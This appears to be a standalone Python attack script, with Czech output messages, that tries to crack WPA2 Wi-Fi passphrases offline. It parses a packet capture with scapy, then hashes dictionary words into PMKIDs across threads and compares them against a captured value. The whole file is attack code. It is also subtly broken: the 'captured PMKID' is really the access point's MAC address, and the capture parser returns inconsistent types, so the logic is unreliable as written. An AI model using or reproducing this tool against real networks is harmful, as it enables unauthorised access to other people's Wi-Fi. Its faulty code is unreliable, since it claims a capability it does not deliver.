import hmac
from hashlib import pbkdf2_hmac, sha1
import argparse
import threading
import concurrent.futures
import time
import scapy.all as scapy


def calculate_pmkid(pmk, ap_mac, sta_mac):
    pmkid = hmac.new(pmk, b"PMK Name" + ap_mac + sta_mac, sha1).digest()[:16]
    return pmkid


def find_pw_chunk(pw_list, ssid, ap_mac, sta_mac, captured_pmkid, stop_event, live_output):
    for pw in pw_list:
        if stop_event.is_set():
            break
        password = pw.strip()
        pmk = pbkdf2_hmac("sha1", password.encode("utf-8"), ssid, 4096, 32)
        pmkid = calculate_pmkid(pmk, ap_mac, sta_mac)
        
        # Update live output
        live_output(f"ZKOUŠÍM HESLO: {password}")

        if pmkid == captured_pmkid:
            live_output(f"\nHESLO NALEZENO! [{password}]")
            stop_event.set()


def parse_pcap(file_path):
    packets = scapy.rdpcap(file_path)
    networks = {}
    
    for packet in packets:
        if packet.haslayer(scapy.Dot11Beacon):
            ssid = packet[scapy.Dot11Elt].info.decode()
            bssid = packet[scapy.Dot11].addr3
            encryption = packet[scapy.Dot11Beacon].network_stats().get("encryption", "")
            networks[bssid] = {"ssid": ssid, "encryption": encryption}
        
        if packet.haslayer(scapy.EAPOL):
            return True  # Found a handshake

    return networks


def live_output(message):
    print(f"\r{message}", end="")


def main():
    parser = argparse.ArgumentParser(prog='pmkidcracker', 
                                     description='A tool to crack WPA2 passphrase using obtained PMKID.',
                                     usage='%(prog)s -P WORDLIST capture.pcap')

    parser.add_argument("-P", "--wordlist", help="Dictionary wordlist to use", required=True)
    parser.add_argument("capture", help="Capture file (.cap or .pcap)", type=str)

    args = parser.parse_args()

    print(f"[*] Otevírám: {args.wordlist} se slovníkem {args.capture}")

    networks = parse_pcap(args.capture)
    
    if len(networks) > 1:
        print("Vyberte síť:")
        for bssid, data in networks.items():
            print(f"SSID: {data['ssid']} | BSSID: {bssid} | Šifrování: {data['encryption']}")
        return
    
    handshake_found = False
    for bssid, data in networks.items():
        if data['encryption']:
            print(f"HANDSHAKE {data['ssid']} ({bssid})")
            handshake_found = True
            break

    if not handshake_found:
        print("Žádný handshake nalezen.")
        return

    ssid = data['ssid'].encode()
    bssid = bytes.fromhex(bssid.replace(":", ""))
    stop_event = threading.Event()

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor, open(args.wordlist, "r", encoding='ISO-8859-1') as file:
        start = time.perf_counter()
        chunk_size = 100000
        futures = []
        
        while True:
            pw_list = file.readlines(chunk_size)
            if not pw_list:
                break

            if stop_event.is_set():
                break

            future = executor.submit(find_pw_chunk, pw_list, ssid, bssid, bssid, bssid, stop_event, live_output)
            futures.append(future)

        for future in concurrent.futures.as_completed(futures):
            pass

    finish = time.perf_counter()
    print(f"\n[*] Dokončeno za {round(finish - start, 2)} sekund(y)")


if __name__ == '__main__':
    main()
